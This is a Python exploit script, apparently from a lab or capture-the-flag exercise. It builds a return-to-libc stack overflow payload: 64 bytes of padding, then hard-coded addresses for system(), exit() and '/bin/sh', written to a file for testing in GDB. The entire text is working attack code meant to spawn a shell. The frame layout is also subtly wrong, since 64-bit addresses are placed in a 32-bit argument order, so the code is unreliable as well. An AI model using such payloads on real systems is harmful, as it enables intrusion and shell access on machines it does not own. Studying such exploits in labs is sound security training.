import struct

system_addr = struct.pack("<Q", 0x7ffff7bafd70)  # system()
exit_addr = struct.pack("<Q", 0x7ffff7ba45f0)    # exit()
binsh_addr = struct.pack("<Q", 0x7ffff7d37678)   # "/bin/sh"

# Constructing the payload
payload = b"A" * 64  
payload += system_addr  
payload += exit_addr   
payload += binsh_addr   

# Save payload to file for testing in GDB
with open("input.bin", "wb") as f:
    f.write(payload)

print(payload)